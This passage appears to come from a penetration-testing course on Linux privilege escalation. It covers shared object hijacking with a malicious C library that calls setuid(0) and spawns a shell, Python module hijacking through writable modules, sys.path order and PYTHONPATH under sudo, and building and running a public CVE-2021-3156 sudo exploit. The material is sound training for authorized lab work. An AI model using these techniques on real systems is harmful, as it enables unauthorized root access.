<pre><code class="lang-shell-session">htb_student<span class="hljs-variable">@NIX02</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>sudo LD_PRELOAD=<span class="hljs-regexp">/tmp/root</span>.so /usr/sbin/apache2 restart

id
uid=<span class="hljs-number">0</span>(root) gid=<span class="hljs-number">0</span>(root) groups=<span class="hljs-number">0</span>(root)
</code></pre>
<h2 id="shared-object-hijacking">Shared Object Hijacking</h2>
<hr>
<p>Programs and binaries under development usually have custom libraries associated with them. Consider the following <code>SETUID</code> binary.</p>
<p>Shared Object Hijacking</p>
<pre><code class="lang-shell-session">htb_student<span class="hljs-variable">@NIX02</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>ls -la payroll

-rwsr-xr-x <span class="hljs-number">1</span> root root <span class="hljs-number">16728</span> Sep  <span class="hljs-number">1</span> <span class="hljs-number">22</span><span class="hljs-symbol">:</span><span class="hljs-number">05</span> payroll
</code></pre>
<p>We can use <a href="https://manpages.ubuntu.com/manpages/bionic/man1/ldd.1.html">ldd</a> to print the shared object required by a binary or shared object. <code>Ldd</code> displays the location of the object and the hexadecimal address where it is loaded into memory for each of a program&#39;s dependencies.</p>
<p>Shared Object Hijacking</p>
<pre><code class="lang-shell-session">htb_student@NIX02:~$ ldd payroll

linux-vdso<span class="hljs-selector-class">.so</span>.<span class="hljs-number">1</span> =&gt;  (<span class="hljs-number">0</span>x00007ffcb3133000)
libshared<span class="hljs-selector-class">.so</span> =&gt; /lib/x86_64-linux-gnu/libshared<span class="hljs-selector-class">.so</span> (<span class="hljs-number">0</span>x00007f7f62e51000)
libc<span class="hljs-selector-class">.so</span>.<span class="hljs-number">6</span> =&gt; /lib/x86_64-linux-gnu/libc<span class="hljs-selector-class">.so</span>.<span class="hljs-number">6</span> (<span class="hljs-number">0</span>x00007f7f62876000)
/lib64/ld-linux-x86-<span class="hljs-number">64</span><span class="hljs-selector-class">.so</span>.<span class="hljs-number">2</span> (<span class="hljs-number">0</span>x00007f7f62c40000)
</code></pre>
<p>We see a non-standard library named <code>libshared.so</code> listed as a dependency for the binary. As stated earlier, it is possible to load shared libraries from custom locations. One such setting is the <code>RUNPATH</code> configuration. Libraries in this folder are given preference over other folders. This can be inspected using the <a href="https://man7.org/linux/man-pages/man1/readelf.1.html">readelf</a> utility.</p>
<p>Shared Object Hijacking</p>
<pre><code class="lang-shell-session">htb_student<span class="hljs-variable">@NIX02</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>readelf -d payroll  | grep PATH

 <span class="hljs-number">0x000000000000001d</span> (RUNPATH)            Library <span class="hljs-symbol">runpath:</span> [<span class="hljs-regexp">/development]</span>
</code></pre>
<p>The configuration allows the loading of libraries from the <code>/development</code> folder, which is writable by all users. This misconfiguration can be exploited by placing a malicious library in <code>/development</code>, which will take precedence over other folders because entries in this file are checked first (before other folders present in the configuration files).</p>
<p>Shared Object Hijacking</p>
<pre><code class="lang-shell-session">htb_student@NIX02:~$ ls -la /development/

total 8
drwxrwxrwx <span class="hljs-number"> 2 </span>root root<span class="hljs-number"> 4096 </span>Sep <span class="hljs-number"> 1 </span>22:06 ./
drwxr-xr-x<span class="hljs-number"> 23 </span>root root<span class="hljs-number"> 4096 </span>Sep <span class="hljs-number"> 1 </span>21:26 ../
</code></pre>
<p>Before compiling a library, we need to find the function name called by the binary.</p>
<p>Shared Object Hijacking</p>
<pre><code class="lang-shell-session">htb_student@<span class="hljs-symbol">NIX02:</span>~$ cp /<span class="hljs-class"><span class="hljs-keyword">lib</span>/<span class="hljs-title">x86_64</span>-<span class="hljs-title">linux</span>-<span class="hljs-title">gnu</span>/<span class="hljs-title">libc</span>.<span class="hljs-title">so</span>.6 /<span class="hljs-title">development</span>/<span class="hljs-title">libshared</span>.<span class="hljs-title">so</span></span>
</code></pre>
<p>Shared Object Hijacking</p>
<pre><code class="lang-shell-session">htb_student@NIX02:~$ ldd payroll

linux-vdso<span class="hljs-selector-class">.so</span>.<span class="hljs-number">1</span> (<span class="hljs-number">0</span>x00007ffd22bbc000)
libshared<span class="hljs-selector-class">.so</span> =&gt; /development/libshared<span class="hljs-selector-class">.so</span> (<span class="hljs-number">0</span>x00007f0c13112000)
/lib64/ld-linux-x86-<span class="hljs-number">64</span><span class="hljs-selector-class">.so</span>.<span class="hljs-number">2</span> (<span class="hljs-number">0</span>x00007f0c1330a000)
</code></pre>
<p>Shared Object Hijacking</p>
<pre><code class="lang-shell-session">htb_student<span class="hljs-meta">@NIX</span><span class="hljs-number">02:</span>~$ ./payroll 

.<span class="hljs-regexp">/payroll: symbol lookup error: ./</span><span class="hljs-string">payroll:</span> undefined <span class="hljs-string">symbol:</span> dbquery
</code></pre>
<p>We can copy an existing library to the <code>development</code> folder. Running <code>ldd</code> against the binary lists the library&#39;s path as <code>/development/libshared.</code>so, which means that it is vulnerable. Executing the binary throws an error stating that it failed to find the function named <code>dbquery</code>. We can compile a shared object which includes this function.</p>
<p>Code: c</p>
<pre><code class="lang-c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span>

<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">dbquery</span><span class="hljs-params">()</span> </span>{
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Malicious library loaded\n"</span>);
    setuid(<span class="hljs-number">0</span>);
    system(<span class="hljs-string">"/bin/sh -p"</span>);
}
</code></pre>
<p>The <code>dbquery</code> function sets our user id to 0 (root) and executing <code>/bin/sh</code> when called. Compile it using <a href="https://linux.die.net/man/1/gcc">GCC</a>.</p>
<p>Shared Object Hijacking</p>
<pre><code class="lang-shell-session">htb_student<span class="hljs-variable">@NIX02</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>gcc src.c -fPIC -shared -o /development/libshared.so
</code></pre>
<p>Executing the binary again should display the banner and pops a root shell.</p>
<p>Shared Object Hijacking</p>
<pre><code class="lang-shell-session">htb_student@NIX02:~$ ./payroll 

<span class="hljs-strong">*****</span><span class="hljs-strong">*****</span><span class="hljs-strong">*****</span>Inlane Freight Employee Database<span class="hljs-strong">*****</span><span class="hljs-strong">*****</span><span class="hljs-strong">*****</span>

Malicious library loaded
<span class="hljs-section"># id</span>
uid=0(root) gid=1000(mrb3n) groups=1000(mrb3n)
</code></pre>
<h2 id="python-library-hijacking">Python Library Hijacking</h2>
<hr>
<p>Python is one of the world&#39;s most popular and widely used programming languages and has already replaced many other programming languages in the IT industry. There are very many reasons why Python is so popular among programmers. One of them is that users can work with a vast collection of libraries.</p>
<p>Many libraries are used in Python and are used in many different fields. One of them is <a href="https://numpy.org/doc/stable/">NumPy</a>. <code>NumPy</code> is an open-source extension for Python. The module provides precompiled functions for numerical analysis. In particular, it allows easy handling of extensive lists and matrices. However, it offers many other essential features, such as functions of random number generation, Fourier transform, linear algebra, and many others. Furthermore, NumPy provides many mathematical functions for working with arrays and matrices.</p>
<p>Another library is <a href="https://pandas.pydata.org/docs/">Pandas</a>. <code>Pandas</code> is a library for data processing and data analysis with Python. It extends Python with data structures and functions for processing data tables. A particular strength of Pandas is time series analysis.</p>
<p>Python has <a href="https://docs.python.org/3/library/">the Python standard library</a>, with many modules on board from a standard installation of Python. These modules provide many solutions that would otherwise have to be laboriously worked out by writing our programs. There are countless hours of saved work here if one has an overview of the available modules and their possibilities. The modular system is integrated into this form for performance reasons. If one would automatically have all possibilities immediately available in the basic installation of Python without importing the corresponding module, the speed of all Python programs would suffer greatly.</p>
<p>In Python, we can import modules quite easily:</p>
<p><strong>Importing Modules</strong></p>
<p>Code: python</p>
<pre><code class="lang-python"><span class="hljs-meta">#!/usr/bin/env python3</span>

<span class="hljs-meta"># Method 1</span>
<span class="hljs-keyword">import</span> pandas

<span class="hljs-meta"># Method 2</span>
<span class="hljs-title">from</span> pandas <span class="hljs-keyword">import</span> *

<span class="hljs-meta"># Method 3</span>
<span class="hljs-title">from</span> pandas <span class="hljs-keyword">import</span> Series
</code></pre>
<p>There are many ways in which we can hijack a Python library. Much depends on the script and its contents itself. However, there are three basic vulnerabilities where hijacking can be used:</p>
<ol>
<li>Wrong write permissions</li>
<li>Library Path</li>
<li>PYTHONPATH environment variable</li>
</ol>
<hr>
<h3 id="wrong-write-permissions">Wrong Write Permissions</h3>
<p>For example, we can imagine that we are in a developer&#39;s host on the company&#39;s intranet and that the developer is working with python. So we have a total of three components that are connected. This is the actual python script that imports a python module and the privileges of the script as well as the permissions of the module.</p>
<p>One or another python module may have write permissions set for all users by mistake. This allows the python module to be edited and manipulated so that we can insert commands or functions that will produce the results we want. If <code>SUID</code>/<code>SGID</code> permissions have been assigned to the Python script that imports this module, our code will automatically be included.</p>
<p>If we look at the set permissions of the <code>mem_status.py</code> script, we can see that it has a <code>SUID</code> set.</p>
<p><strong>Python Script</strong></p>
<p>Python Library Hijacking</p>
<pre><code class="lang-shell-session">htb-student<span class="hljs-variable">@lpenix</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>ls -l mem_status.py

-rwsrwxr-x <span class="hljs-number">1</span> root mrb3n <span class="hljs-number">188</span> Dec <span class="hljs-number">13</span> <span class="hljs-number">20</span><span class="hljs-symbol">:</span><span class="hljs-number">13</span> mem_status.py
</code></pre>
<p>So we can execute this script with the privileges of another user, in our case, as <code>root</code>. We also have permission to view the script and read its contents.</p>
<p><strong>Python Script - Contents</strong></p>
<p>Code: python</p>
<pre><code class="lang-python"><span class="hljs-meta">#!/usr/bin/env python3</span>
<span class="hljs-keyword">import</span> psutil

available_memory = psutil.virtual_memory().available * <span class="hljs-number">100</span> / psutil.virtual_memory().total

print(f<span class="hljs-string">"Available memory: {round(available_memory, 2)}%"</span>)
</code></pre>
<p>So this script is quite simple and only shows the available virtual memory in percent. We can also see in the second line that this script imports the module <code>psutil</code> and uses the function <code>virtual_memory()</code>.</p>
<p>So we can look for this function in the folder of <code>psutil</code> and check if this module has write permissions for us.</p>
<p><strong>Module Permissions</strong></p>
<p>Python Library Hijacking</p>
<pre><code class="lang-shell-session">htb-student@<span class="hljs-symbol">lpenix:</span>~$ grep -r <span class="hljs-string">"def virtual_memory"</span> /usr/local/<span class="hljs-class"><span class="hljs-keyword">lib</span>/<span class="hljs-title">python3</span>.8/<span class="hljs-title">dist</span>-<span class="hljs-title">packages</span>/<span class="hljs-title">psutil</span>/*</span>

/usr/local/<span class="hljs-class"><span class="hljs-keyword">lib</span>/<span class="hljs-title">python3</span>.8/<span class="hljs-title">dist</span>-<span class="hljs-title">packages</span>/<span class="hljs-title">psutil</span>/<span class="hljs-title">__init__</span>.<span class="hljs-title">py</span>:<span class="hljs-title">def</span> <span class="hljs-title">virtual_memory</span>():</span>
/usr/local/<span class="hljs-class"><span class="hljs-keyword">lib</span>/<span class="hljs-title">python3</span>.8/<span class="hljs-title">dist</span>-<span class="hljs-title">packages</span>/<span class="hljs-title">psutil</span>/<span class="hljs-title">_psaix</span>.<span class="hljs-title">py</span>:<span class="hljs-title">def</span> <span class="hljs-title">virtual_memory</span>():</span>
/usr/local/<span class="hljs-class"><span class="hljs-keyword">lib</span>/<span class="hljs-title">python3</span>.8/<span class="hljs-title">dist</span>-<span class="hljs-title">packages</span>/<span class="hljs-title">psutil</span>/<span class="hljs-title">_psbsd</span>.<span class="hljs-title">py</span>:<span class="hljs-title">def</span> <span class="hljs-title">virtual_memory</span>():</span>
/usr/local/<span class="hljs-class"><span class="hljs-keyword">lib</span>/<span class="hljs-title">python3</span>.8/<span class="hljs-title">dist</span>-<span class="hljs-title">packages</span>/<span class="hljs-title">psutil</span>/<span class="hljs-title">_pslinux</span>.<span class="hljs-title">py</span>:<span class="hljs-title">def</span> <span class="hljs-title">virtual_memory</span>():</span>
/usr/local/<span class="hljs-class"><span class="hljs-keyword">lib</span>/<span class="hljs-title">python3</span>.8/<span class="hljs-title">dist</span>-<span class="hljs-title">packages</span>/<span class="hljs-title">psutil</span>/<span class="hljs-title">_psosx</span>.<span class="hljs-title">py</span>:<span class="hljs-title">def</span> <span class="hljs-title">virtual_memory</span>():</span>
/usr/local/<span class="hljs-class"><span class="hljs-keyword">lib</span>/<span class="hljs-title">python3</span>.8/<span class="hljs-title">dist</span>-<span class="hljs-title">packages</span>/<span class="hljs-title">psutil</span>/<span class="hljs-title">_pssunos</span>.<span class="hljs-title">py</span>:<span class="hljs-title">def</span> <span class="hljs-title">virtual_memory</span>():</span>
/usr/local/<span class="hljs-class"><span class="hljs-keyword">lib</span>/<span class="hljs-title">python3</span>.8/<span class="hljs-title">dist</span>-<span class="hljs-title">packages</span>/<span class="hljs-title">psutil</span>/<span class="hljs-title">_pswindows</span>.<span class="hljs-title">py</span>:<span class="hljs-title">def</span> <span class="hljs-title">virtual_memory</span>():</span>


htb-student@<span class="hljs-symbol">lpenix:</span>~$ ls -l /usr/local/<span class="hljs-class"><span class="hljs-keyword">lib</span>/<span class="hljs-title">python3</span>.8/<span class="hljs-title">dist</span>-<span class="hljs-title">packages</span>/<span class="hljs-title">psutil</span>/<span class="hljs-title">__init__</span>.<span class="hljs-title">py</span></span>

-rw-r--rw- <span class="hljs-number">1</span> root staff <span class="hljs-number">87339</span> Dec <span class="hljs-number">13</span> <span class="hljs-number">20</span>:<span class="hljs-number">07</span> /usr/local/<span class="hljs-class"><span class="hljs-keyword">lib</span>/<span class="hljs-title">python3</span>.8/<span class="hljs-title">dist</span>-<span class="hljs-title">packages</span>/<span class="hljs-title">psutil</span>/<span class="hljs-title">__init__</span>.<span class="hljs-title">py</span></span>
</code></pre>
<p>Such permissions are most common in developer environments where many developers work on different scripts and may require higher privileges.</p>
<p><strong>Module Contents</strong></p>
<p>Code: python</p>
<pre><code class="lang-python">...SNIP...

def virtual_memory():

    ...SNIP...

    <span class="hljs-keyword">global</span> _TOTAL_PHYMEM
    <span class="hljs-keyword">ret</span> = _psplatform.virtual_memory()
    # cached <span class="hljs-keyword">for</span> later <span class="hljs-keyword">use</span> <span class="hljs-keyword">in</span> Process.memory_percent()
    _TOTAL_PHYMEM = <span class="hljs-keyword">ret</span>.<span class="hljs-keyword">total</span>
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">ret</span>

...SNIP...
</code></pre>
<p>This is the part in the library where we can insert our code. It is recommended to put it right at the beginning of the function. There we can insert everything we consider correct and effective. We can import the module <code>os</code> for testing purposes, which allows us to execute system commands. With this, we can insert the command <code>id</code> and check during the execution of the script if the inserted code is executed.</p>
<p><strong>Module Contents - Hijacking</strong></p>
<p>Code: python</p>
<pre><code class="lang-python">...SNIP...

def virtual_memory():

    ...SNIP...
    #### Hijacking
    <span class="hljs-keyword">import</span> os
    os.<span class="hljs-keyword">system</span>(<span class="hljs-string">'id'</span>)


    global _TOTAL_PHYMEM
    ret = _psplatform.virtual_memory()
    # cached for later use <span class="hljs-keyword">in</span> Process.memory_percent()
    _TOTAL_PHYMEM = ret.total
    return ret

...SNIP...
</code></pre>
<p>Now we can run the script with <code>sudo</code> and check if we get the desired result.</p>
<p><strong>Privilege Escalation</strong></p>
<p>Python Library Hijacking</p>
<pre><code class="lang-shell-session">htb-student@lpenix:~$ sudo /usr/bin/python3 ./mem_status.py

<span class="hljs-attr">uid=0(root)</span> <span class="hljs-attr">gid=0(root)</span> <span class="hljs-attr">groups=0(root)</span>
<span class="hljs-attr">uid=0(root)</span> <span class="hljs-attr">gid=0(root)</span> <span class="hljs-attr">groups=0(root)</span>
Available memory: <span class="hljs-number">79.22</span>%
</code></pre>
<p>Success. As we can see from the result above, we were successfully able to hijack the library and have our code inside of the <code>virtual_memory()</code> function run as <code>root</code>. Now that we have the desired result, we can edit the library again, but this time, insert a reverse shell that connects to our host as <code>root</code>.</p>
<hr>
<h3 id="library-path">Library Path</h3>
<p>In Python, each version has a specified order in which libraries (<code>modules</code>) are searched and imported from. The order in which Python imports <code>modules</code> from are based on a priority system, meaning that paths higher on the list take priority over ones lower on the list. We can see this by issuing the following command:</p>
<p><strong>PYTHONPATH Listing</strong></p>
<p>Python Library Hijacking</p>
<pre><code class="lang-shell-session">htb-student@<span class="hljs-symbol">lpenix:</span>~$ python3 -c <span class="hljs-string">'import sys; print("\n".join(sys.path))'</span>

/usr/<span class="hljs-class"><span class="hljs-keyword">lib</span>/<span class="hljs-title">python38</span>.<span class="hljs-title">zip</span></span>
/usr/<span class="hljs-class"><span class="hljs-keyword">lib</span>/<span class="hljs-title">python3</span>.8</span>
/usr/<span class="hljs-class"><span class="hljs-keyword">lib</span>/<span class="hljs-title">python3</span>.8/<span class="hljs-title">lib</span>-<span class="hljs-title">dynload</span></span>
/usr/local/<span class="hljs-class"><span class="hljs-keyword">lib</span>/<span class="hljs-title">python3</span>.8/<span class="hljs-title">dist</span>-<span class="hljs-title">packages</span></span>
/usr/<span class="hljs-class"><span class="hljs-keyword">lib</span>/<span class="hljs-title">python3</span>/<span class="hljs-title">dist</span>-<span class="hljs-title">packages</span></span>
</code></pre>
<p>To be able to use this variant, two prerequisites are necessary.</p>
<ol>
<li>The module that is imported by the script is located under one of the lower priority paths listed via the <code>PYTHONPATH</code> variable.</li>
<li>We must have write permissions to one of the paths having a higher priority on the list.</li>
</ol>
<p>Therefore, if the imported module is located in a path lower on the list and a higher priority path is editable by our user, we can create a module ourselves with the same name and include our own desired functions. Since the higher priority path is read earlier and examined for the module in question, Python accesses the first hit it finds and imports it before reaching the original and intended module.</p>
<p>In order for this to make a bit more sense, let us continue with the previous example and show how this can be exploited. Previously, the <code>psutil</code> module was imported into the <code>mem_status.py</code> script. We can see <code>psutil</code>&#39;s default installation location by issuing the following command:</p>
<p><strong>Psutil Default Installation Location</strong></p>
<p>Python Library Hijacking</p>
<pre><code class="lang-shell-session">htb-student@<span class="hljs-symbol">lpenix:</span>~$ pip3 show psutil

...SNIP...
<span class="hljs-symbol">Location:</span> /usr/local/<span class="hljs-class"><span class="hljs-keyword">lib</span>/<span class="hljs-title">python3</span>.8/<span class="hljs-title">dist</span>-<span class="hljs-title">packages</span></span>

...SNIP...
</code></pre>
<p>From this example, we can see that <code>psutil</code> is installed in the following path: <code>/usr/local/lib/python3.8/dist-packages</code>. From our previous listing of the <code>PYTHONPATH</code> variable, we have a reasonable amount of directories to choose from to see if there might be any misconfigurations in the environment to allow us <code>write</code> access to any of them. Let us check.</p>
<p><strong>Misconfigured Directory Permissions</strong></p>
<p>Python Library Hijacking</p>
<pre><code class="lang-shell-session">htb-student@<span class="hljs-symbol">lpenix:</span>~$ ls -la /usr/<span class="hljs-class"><span class="hljs-keyword">lib</span>/<span class="hljs-title">python3</span>.8</span>

total <span class="hljs-number">4916</span>
drwxr-xrwx <span class="hljs-number">30</span> root root  <span class="hljs-number">20480</span> Dec <span class="hljs-number">14</span> <span class="hljs-number">16</span>:<span class="hljs-number">26</span> .
...SNIP...
</code></pre>
<p>After checking all of the directories listed, it appears that <code>/usr/lib/python3.8</code> path is misconfigured in a way to allow any user to write to it. Cross-checking with values from the <code>PYTHONPATH</code> variable, we can see that this path is higher on the list than the path in which <code>psutil</code> is installed in. Let us try abusing this misconfiguration to create our own <code>psutil</code> module containing our own malicious <code>virtual_memory()</code> function within the <code>/usr/lib/python3.8</code> directory.</p>
<p><strong>Hijacked Module Contents - psutil.py</strong></p>
<p>Code: python</p>
<pre><code class="lang-python"><span class="hljs-comment">#!/usr/bin/env python3</span>

<span class="hljs-keyword">import</span> os

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">virtual_memory</span><span class="hljs-params">()</span>:</span>
    os.system(<span class="hljs-string">'id'</span>)
</code></pre>
<p>In order to get to this point, we need to create a file called <code>psutil.py</code> containing the contents listed above in the previously mentioned directory. It is very important that we make sure that the module we create has the same name as the import as well as have the same function with the correct number of arguments passed to it as the function we are intending to hijack. This is critical as without either of these conditions being <code>true</code>, we will not be able perform this attack. After creating this file containing the example of our previous hijacking script, we have successfully prepped the system for exploitation.</p>
<p>Let us once again run the <code>mem_status.py</code> script using <code>sudo</code> like in the previous example.</p>
<p><strong>Privilege Escalation via Hijacking Python Library Path</strong></p>
<p>Python Library Hijacking</p>
<pre><code class="lang-shell-session">htb-student@lpenix:~$ sudo /usr/bin/python3 mem_status.py

uid=0(root) gid=0(root) groups=0(root)
Traceback (most recent <span class="hljs-keyword">call</span> <span class="hljs-keyword">last</span>):
  <span class="hljs-keyword">File</span> <span class="hljs-string">"mem_status.py"</span>, line <span class="hljs-number">4</span>, <span class="hljs-keyword">in</span> &lt;<span class="hljs-keyword">module</span>&gt;
    available_memory = psutil.virtual_memory().available * <span class="hljs-number">100</span> / psutil.virtual_memory().total
AttributeError: <span class="hljs-string">'NoneType'</span> <span class="hljs-keyword">object</span> has <span class="hljs-keyword">no</span> <span class="hljs-keyword">attribute</span> <span class="hljs-string">'available'</span>
</code></pre>
<p>As we can see from the output, we have successfully gained execution as <code>root</code> through hijacking the module&#39;s path via a misconfiguration in the permissions of the <code>/usr/lib/python3.8</code> directory.</p>
<hr>
<h3 id="pythonpath-environment-variable">PYTHONPATH Environment Variable</h3>
<p>In the previous section, we touched upon the term <code>PYTHONPATH</code>, however, didn&#39;t fully explain it&#39;s use and importance regarding the functionality of Python. <code>PYTHONPATH</code> is an environment variable that indicates what directory (or directories) Python can search for modules to import. This is important as if a user is allowed to manipulate and set this variable while running the python binary, they can effectively redirect Python&#39;s search functionality to a <code>user-defined</code> location when it comes time to import modules. We can see if we have the permissions to set environment variables for the python binary by checking our <code>sudo</code> permissions:</p>
<p><strong>Checking sudo permissions</strong></p>
<p>Python Library Hijacking</p>
<pre><code class="lang-shell-session">htb-student<span class="hljs-variable">@lpenix</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>sudo -l 

Matching Defaults entries <span class="hljs-keyword">for</span> htb-student on ACADEMY-<span class="hljs-symbol">LPENIX:</span>
    env_reset, mail_badpass, secure_path=<span class="hljs-regexp">/usr/local</span><span class="hljs-regexp">/sbin\:/usr</span><span class="hljs-regexp">/local/bin</span>\<span class="hljs-symbol">:/usr/sbin</span>\<span class="hljs-symbol">:/usr/bin</span>\<span class="hljs-symbol">:/sbin</span>\<span class="hljs-symbol">:/bin</span>\<span class="hljs-symbol">:/snap/bin</span>

User htb-student may run the following commands on ACADEMY-<span class="hljs-symbol">LPENIX:</span>
    (ALL : ALL) <span class="hljs-symbol">SETENV:</span> <span class="hljs-symbol">NOPASSWD:</span> /usr/bin/python3
</code></pre>
<p>As we can see from the example, we are allowed to run <code>/usr/bin/python3</code> under the trusted permissions of <code>sudo</code> and are therefore allowed to set environment variables for use with this binary by the <code>SETENV:</code> flag being set. It is important to note, that due to the trusted nature of <code>sudo</code>, any environment variables defined prior to calling the binary are not subject to any restrictions regarding being able to set environment variables on the system. This means that using the <code>/usr/bin/python3</code> binary, we can effectively set any environment variables under the context of our running program. Let&#39;s try to do so now using the <code>psutil.py</code> script from the last section.</p>
<p><strong>Privilege Escalation using PYTHONPATH Environment Variable</strong></p>
<pre><code class="lang-shell-session">htb-student<span class="hljs-variable">@lpenix</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>sudo PYTHONPATH=<span class="hljs-regexp">/tmp/</span> /usr/bin/python3 ./mem_status.py

uid=<span class="hljs-number">0</span>(root) gid=<span class="hljs-number">0</span>(root) groups=<span class="hljs-number">0</span>(root)
...SNIP...
</code></pre>
<p>In this example, we moved the previous python script from the <code>/usr/lib/python3.8</code> directory to <code>/tmp</code>. From here we once again call <code>/usr/bin/python3</code> to run <code>mem_stats.py</code>, however, we specify that the <code>PYTHONPATH</code> variable contain the <code>/tmp</code> directory so that it forces Python to search that directory looking for the <code>psutil</code> module to import. As we can see, we once again have successfully run our script under the context of root.</p>
<h2 id="sudo">Sudo</h2>
<hr>
<p>The program <code>sudo</code> is used under UNIX operating systems like Linux or macOS to start processes with the rights of another user. In most cases, commands are executed that are only available to administrators. It serves as an additional layer of security or a safeguard to prevent the system and its contents from being damaged by unauthorized users. The <code>/etc/sudoers</code> file specifies which users or groups are allowed to run specific programs and with what privileges.</p>
<p>Sudo</p>
<pre><code class="lang-shell-session">cry0l1t3@nix02:~<span class="hljs-symbol">$</span> sudo cat /etc/sudoers | grep -v <span class="hljs-string">"#"</span> | sed -r <span class="hljs-string">'/^\s*$/d'</span>
[sudo] password <span class="hljs-keyword">for</span> cry0l1t3:  **********

Defaults        env_reset
Defaults        mail_badpass
Defaults        secure_path=<span class="hljs-string">"/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin"</span>
Defaults        use_pty
root            <span class="hljs-keyword">ALL</span>=(<span class="hljs-keyword">ALL</span>:<span class="hljs-keyword">ALL</span>) <span class="hljs-keyword">ALL</span>
%admin          <span class="hljs-keyword">ALL</span>=(<span class="hljs-keyword">ALL</span>) <span class="hljs-keyword">ALL</span>
%sudo           <span class="hljs-keyword">ALL</span>=(<span class="hljs-keyword">ALL</span>:<span class="hljs-keyword">ALL</span>) <span class="hljs-keyword">ALL</span>
cry0l1t3        <span class="hljs-keyword">ALL</span>=(<span class="hljs-keyword">ALL</span>) /usr/bin/id
@includedir     /etc/sudoers.d
</code></pre>
<p>One of the latest vulnerabilities for <code>sudo</code> carries the CVE-2021-3156 and is based on a heap-based buffer overflow vulnerability. This affected the sudo versions:</p>
<ul>
<li>1.8.31 - Ubuntu 20.04</li>
<li>1.8.27 - Debian 10</li>
<li>1.9.2 - Fedora 33</li>
<li>and others</li>
</ul>
<p>To find out the version of <code>sudo</code>, the following command is sufficient:</p>
<p>Sudo</p>
<pre><code class="lang-shell-session">cry0l1t3<span class="hljs-variable">@nix02</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>sudo -V | head -n1

Sudo version <span class="hljs-number">1.8</span>.<span class="hljs-number">31</span>
</code></pre>
<p>The interesting thing about this vulnerability was that it had been present for over ten years until it was discovered. There is also a public <a href="https://github.com/blasty/CVE-2021-3156">Proof-Of-Concept</a> that can be used for this. We can either download this to a copy of the target system we have created or, if we have an internet connection, to the target system itself.</p>
<p>Sudo</p>
<pre><code class="lang-shell-session">cry0l1t3@nix02:~$ git clone http<span class="hljs-variable">s:</span>//github.<span class="hljs-keyword">com</span>/blasty/CVE-<span class="hljs-number">2021</span>-<span class="hljs-number">3156</span>.git
cry0l1t3@nix02:~$ <span class="hljs-keyword">cd</span> CVE-<span class="hljs-number">2021</span>-<span class="hljs-number">3156</span>
cry0l1t3@nix02:~$ <span class="hljs-keyword">make</span>

rm -rf libnss_X
<span class="hljs-built_in">mkdir</span> libnss_X
gcc -std=c99 -<span class="hljs-keyword">o</span> sudo-hax-<span class="hljs-keyword">me</span>-<span class="hljs-keyword">a</span>-sandwich hax.<span class="hljs-keyword">c</span>
gcc -fPIC -shared -<span class="hljs-keyword">o</span> <span class="hljs-string">'libnss_X/P0P_SH3LLZ_ .so.2'</span> lib.<span class="hljs-keyword">c</span>
</code></pre>
<p>When running the exploit, we can be shown a list that will list all available versions of the operating systems that may be affected by this vulnerability.</p>
<p>Sudo</p>
<pre><code class="lang-shell-session">cry0l1t3@nix02:~$ ./sudo-hax-<span class="hljs-keyword">me</span>-<span class="hljs-keyword">a</span>-sandwich

** CVE-<span class="hljs-number">2021</span>-<span class="hljs-number">3156</span> PoC by blasty &lt;peter@haxx.in&gt;

  usage: ./sudo-hax-<span class="hljs-keyword">me</span>-<span class="hljs-keyword">a</span>-sandwich <span class="hljs-symbol">&lt;target&gt;</span>

  available target<span class="hljs-variable">s:</span>
  ------------------------------------------------------------
    <span class="hljs-number">0</span>) Ubuntu <span class="hljs-number">18.04</span>.<span class="hljs-number">5</span> (Bionic Beaver) - sudo <span class="hljs-number">1.8</span>.<span class="hljs-number">21</span>, libc-<span class="hljs-number">2.27</span>
    <span class="hljs-number">1</span>) Ubuntu <span class="hljs-number">20.04</span>.<span class="hljs-number">1</span> (Focal Fossa) - sudo <span class="hljs-number">1.8</span>.<span class="hljs-number">31</span>, libc-<span class="hljs-number">2.31</span>
    <span class="hljs-number">2</span>) Debian <span class="hljs-number">10.0</span> (Buster) - sudo <span class="hljs-number">1.8</span>.<span class="hljs-number">27</span>, libc-<span class="hljs-number">2.28</span>
  ------------------------------------------------------------

  manual <span class="hljs-keyword">mode</span>:
    ./sudo-hax-<span class="hljs-keyword">me</span>-<span class="hljs-keyword">a</span>-sandwich <span class="hljs-symbol">&lt;smash_len_a&gt;</span> <span class="hljs-symbol">&lt;smash_len_b&gt;</span> <span class="hljs-symbol">&lt;null_stomp_len&gt;</span> <span class="hljs-symbol">&lt;lc_all_len&gt;</span>
</code></pre>
<p>We can find out which version of the operating system we are dealing with using the following command:</p>
<p>Sudo</p>
<pre><code class="lang-shell-session">cry0l1t3@nix02:~$ cat /etc/lsb-release

DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=<span class="hljs-number">20.04</span>
DISTRIB_CODENAME=focal
DISTRIB_DESCRIPTION=<span class="hljs-string">"Ubuntu 20.04.1 LTS"</span>
</code></pre>
<p>Next, we specify the respective ID for the version operating system and run the exploit with our payload.</p>
<p>Sudo</p>
<pre><code class="lang-shell-session">cry0l1t3<span class="hljs-variable">@nix02</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>./sudo-hax-me-a-sandwich <span class="hljs-number">1</span>

** CVE-<span class="hljs-number">2021</span>-<span class="hljs-number">3156</span> PoC by blasty &lt;peter<span class="hljs-variable">@haxx</span>.<span class="hljs-keyword">in</span>&gt;

